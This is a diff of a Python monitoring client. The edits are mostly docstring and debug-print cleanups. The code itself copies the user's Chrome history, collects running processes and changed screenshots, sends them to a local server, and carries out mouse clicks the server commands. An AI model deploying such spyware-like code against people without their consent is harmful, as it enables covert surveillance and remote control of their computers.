@@ -23,7 +23,9 @@ class ProcessDetails:
         pass
 
     def get_running_processes(self):
-        """Returning a list of the current running processes in the computer"""
+        """
+        Returning a list of the current running processes in the computer
+        """
         self.running_programs = []
         pid = []
         name = []
@@ -40,7 +42,11 @@ class ScreenShot:
         pass
 
     def send_screenshot(self, computer_id):
-        """Sending the screenshots to the server as long as the picture actually changes"""
+        """
+        :param computer_id: the id of the current computer
+
+        Sending the screenshots to the server as long as the picture actually changes
+        """
         first_occu = 0
         prev_img = ""
         with mss.mss() as sct:
@@ -66,8 +72,10 @@ class SendToServer:
         self.send_request_to = send_request_to
 
     def send_computer_details(self, running_proc, com_history):
-        """send the data of the computer (without the screenshot)
-        running_proc -- the object of the class "ProcessDetails"
+        """
+        :param running_proc: the object of the class "ProcessDetails"
+
+        send the data of the computer (without the screenshot)
         """
         while True:
             requests.post(self.send_request_to, json={"running processes": running_proc.get_running_processes()[0], "chrome history": com_history.get_chrome_history()})
@@ -80,7 +88,10 @@ class GetHistory:
 
     def get_chrome_history(self):
         ###
-        """Getting the user's chrome history from the DB and returning the 10 most recent history searches"""
+        """
+        Getting the user's chrome history from the DB and returning the 10 most recent history searches
+        """
+
         user = getpass.getuser()
         history = "C:\\Users\\" + user + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
         copyfile(history, '.\\ChromeHistoryCopy')
@@ -102,10 +113,6 @@ class GetHistory:
                     chrome_hisory.append(url)
         return chrome_hisory
 
-    def get_dns_records(self):
-        """TD if I find it necessary"""
-        pass
-
 
 class ComputerAction:
     def __init__(self):
@@ -114,11 +121,22 @@ class ComputerAction:
         self.s.connect(('127.0.0.1', port))
     
     def click(self, x, y):
+        """
+        :param x: the X coordinates 
+        :param y: the Y coordinates
+
+        The function clicks on the X & Y coordinates on the screen.
+        """
         win32api.SetCursorPos((x,y))
         win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN,x,y,0,0)
         win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP,x,y,0,0)
 
     def check_mouse_click(self, computer_id):
+        """
+        :param computer_id the id of the current computer
+
+        the function executes the commands that the server sent to it
+        """
         self.s.send(str(computer_id).encode())
         while True:
             server_command = self.s.recv(1024)
@@ -138,26 +156,20 @@ class ComputerAction:
 
 
 def computer_mac_address():
+    """
+    The function returns the mac address of the computer
+    """
     return getmac.get_mac_address()
 
 def main():
-    status_code = 200
     address_link = 'http://127.0.0.1:5000/computers/verify_login'
     response = requests.get(address_link)
     status_code = response.status_code
-    print(status_code)
     computer_id = ""
-    send_request_to = ""
-    print(computer_mac_address())
     if status_code == 200:
-        send_request_to = "http://127.0.0.1:5000/computers"
         req_id = requests.post('http://127.0.0.1:5000/computers/verify_login',
                             json={"mac_address": computer_mac_address()})
         computer_id = req_id.content.decode()
-        print("computer id: " + computer_id)
-        print(type(computer_id))
-        if computer_id != "":
-            send_request_to = send_request_to + "/" + computer_id
     screen = ScreenShot()
     running_proc = ProcessDetails()
     server_send = SendToServer(SERVER_URL + "/info/" + computer_id)
